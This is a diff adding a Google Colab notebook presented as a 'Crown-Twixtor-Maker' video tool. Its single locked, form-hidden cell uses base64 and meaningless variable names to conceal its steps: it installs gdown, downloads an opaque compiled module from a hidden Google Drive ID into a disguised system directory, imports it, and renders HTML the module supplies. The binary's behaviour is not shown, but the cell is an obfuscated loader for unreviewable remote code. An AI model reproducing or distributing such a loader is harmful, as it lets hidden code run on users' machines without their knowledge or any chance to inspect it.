@@ -1,0 +1,70 @@
+{
+  "nbformat": 4,
+  "nbformat_minor": 0,
+  "metadata": {
+    "colab": {
+      "provenance": [],
+      "gpuType": "T4",
+      "generative_ai_disabled": true,
+      "authorship_tag": "ABX9TyOe1xmm91lP2yRrtMc+zV3h",
+      "include_colab_link": true
+    },
+    "kernelspec": {
+      "name": "python3",
+      "display_name": "Python 3"
+    },
+    "language_info": {
+      "name": "python"
+    },
+    "accelerator": "GPU"
+  },
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {
+        "id": "view-in-github",
+        "colab_type": "text"
+      },
+      "source": [
+        "<a href=\"https://colab.research.google.com/github/yukioisbrave-cpu/crown-twixtor-maker/blob/main/Crown_Twixtor_Maker\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
+      ]
+    },
+    {
+      "cell_type": "code",
+      "source": [
+        "# @title 👑 Crown-Twixtor-Maker V1\n",
+        "import os as _0x1a, sys as _0x2b, base64 as _0x3c\n",
+        "from IPython.display import display as _0x4d, HTML as _0x5e, Javascript as _0x6f\n",
+        "\n",
+        "_0x70 = _0x3c.b64decode(b'L3Vzci9sb2NhbC9zaGFyZS8uY29uZmlnLy5zeXNfcnVudGltZQ==').decode()\n",
+        "_0x81 = f\"{_0x70}/{_0x3c.b64decode(b'Y3Jvd250d2l4dG9yLnNv').decode()}\"\n",
+        "_0x92 = \"MU5XVkcycmZxN2RtVG8zTWNieUFnS0pVdjBnOHVEazFD\"\n",
+        "\n",
+        "if not _0x1a.path.exists(_0x81):\n",
+        "    _0x1a.makedirs(_0x70, exist_ok=True)\n",
+        "    _0x1a.system(_0x3c.b64decode(b'cGlwIGluc3RhbGwgLXEgZ2Rvd24=').decode())\n",
+        "    _0xa3 = _0x3c.b64decode(_0x92.encode()).decode()\n",
+        "    _0x1a.system(f\"{_0x3c.b64decode(b'Z2Rvd24gLS1pZCA=').decode()}{_0xa3} -O {_0x81} {_0x3c.b64decode(b'LS1xdWlldA==').decode()}\")\n",
+        "\n",
+        "if _0x70 not in _0x2b.path:\n",
+        "    _0x2b.path.insert(0, _0x70)\n",
+        "\n",
+        "_0xb4 = _0x3c.b64decode(b'Y3Jvd250d2l4dG9y').decode()\n",
+        "globals()[_0xb4] = __import__(_0xb4)\n",
+        "\n",
+        "_0x4d(_0x6f(_0x3c.b64decode(b'KGZ1bmN0aW9uKCkgewogICAgdmFyIGEgPSB3aW5kb3cuaW5uZXJXaWR0aCA+PSA3Njh8fCB3aW5kb3cuc2NyZWVuLndpZHRoID49IDc2ODsKICAgIHZhciBiID0gYSA/IDcyMCA6IDU4MDsKICAgIGdvb2dsZS5jb2xhYi5vdXRwdXQuc2V0SWZyYW1lSGVpZ2h0KGIsIHRydWUpOwp9KSgpOw==').decode()))\n",
+        "\n",
+        "_0xc5 = getattr(globals()[_0xb4], _0x3c.b64decode(b'Y29tYmluZWRfaHRtbA==').decode(), None) or getattr(globals()[_0xb4], _0x3c.b64decode(b'aHRtbF91aQ==').decode(), None)\n",
+        "if _0xc5:\n",
+        "    _0x4d(_0x5e(_0xc5))"
+      ],
+      "metadata": {
+        "cellView": "form",
+        "editable": false,
+        "id": "o_B7McgpChyz"
+      },
+      "execution_count": null,
+      "outputs": []
+    }
+  ]
+}
